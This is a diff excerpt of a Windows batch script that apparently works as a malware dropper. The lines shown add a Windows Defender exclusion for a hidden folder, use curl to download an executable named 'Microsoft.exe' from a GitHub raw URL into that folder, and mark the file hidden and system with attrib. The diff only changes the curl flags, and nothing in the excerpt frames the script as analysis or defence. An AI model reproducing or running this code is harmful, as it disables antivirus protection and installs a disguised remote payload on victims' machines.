@@ -117,7 +117,7 @@ REM Exclude hidden folder from Windows Defender
 powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
 
 REM Download payload files to hidden folder using curl
-curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe?"%time%" -o "%hiddenFolder2%\Microsoft.exe"
+curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
 
 REM Set hidden attribute for files
 attrib +h +s "%hiddenFolder2%\Microsoft.exe"
